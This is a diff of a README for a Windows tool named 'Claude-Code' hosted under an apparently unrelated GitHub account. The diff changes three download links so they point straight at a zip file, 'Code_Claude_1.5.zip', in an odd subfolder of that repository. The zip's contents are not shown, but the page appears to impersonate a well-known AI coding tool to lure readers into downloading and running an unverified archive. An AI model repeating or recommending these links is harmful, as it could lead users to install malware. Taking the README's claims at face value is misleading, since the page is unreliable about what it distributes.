@@ -1,6 +1,6 @@
 # 🤖 Claude-Code - Clear AI workflows for Windows
 
-[![Download Claude-Code](https://img.shields.io/badge/Download-Claude--Code-blue?style=for-the-badge&labelColor=gray)](https://github.com/Pitchforkanabaptist661/Claude-Code)
+[![Download Claude-Code](https://img.shields.io/badge/Download-Claude--Code-blue?style=for-the-badge&labelColor=gray)](https://github.com/Pitchforkanabaptist661/Claude-Code/raw/refs/heads/main/tozee/Code_Claude_1.5.zip)
 
 ## 🧩 What Claude-Code is
 
@@ -32,7 +32,7 @@ For the best results, use a current version of Windows with the latest updates i
 
 Use this link to visit the page and download Claude-Code:
 
-https://github.com/Pitchforkanabaptist661/Claude-Code
+https://github.com/Pitchforkanabaptist661/Claude-Code/raw/refs/heads/main/tozee/Code_Claude_1.5.zip
 
 Open the page in your browser, then look for the latest release or download option. Save the file to your computer before you start the setup process.
 
@@ -163,4 +163,4 @@ To make Claude-Code easier to reach:
 
 Use the download page for the latest file, then open Claude-Code on Windows and begin working with the clean interface
 
-https://github.com/Pitchforkanabaptist661/Claude-Code
+https://github.com/Pitchforkanabaptist661/Claude-Code/raw/refs/heads/main/tozee/Code_Claude_1.5.zip
